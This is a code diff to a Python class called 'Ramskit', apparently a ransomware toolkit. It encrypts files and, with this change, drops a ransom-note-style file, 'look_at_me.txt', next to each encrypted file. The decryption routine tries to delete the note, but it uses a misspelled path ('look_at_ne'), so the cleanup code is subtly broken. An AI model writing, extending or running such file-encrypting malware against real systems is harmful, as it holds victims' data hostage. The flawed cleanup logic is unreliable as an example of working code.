@@ -52,6 +52,14 @@ class Ramskit:
             with open(normalized_item, 'wb') as file:
                 file.write(encrypted)
 
+            directory = os.path.dirname(normalized_item)
+            new_path = os.path.join(directory, 'look_at_me.txt')
+
+            with open(new_path, 'w') as file:
+                file.write(f"Hello, your file {normalized_item} has been encrypted. "
+                           f"Use the '-a or --action decrypt' usage to decrypt this file!")
+
+
     def decrypt_file(self, items, key) -> None:
         fernet = Fernet(key)
 
@@ -66,6 +74,15 @@ class Ramskit:
 
             with open(normalized_item, 'wb') as file:
                 file.write(decrypted)
+
+            directory = os.path.dirname(normalized_item)
+            new_path = os.path.join(directory, 'look_at_ne')
+
+            if os.path.exists(new_path):
+                os.remove(new_path)
+
+
+
 
     @staticmethod
     def generate_key() -> int:
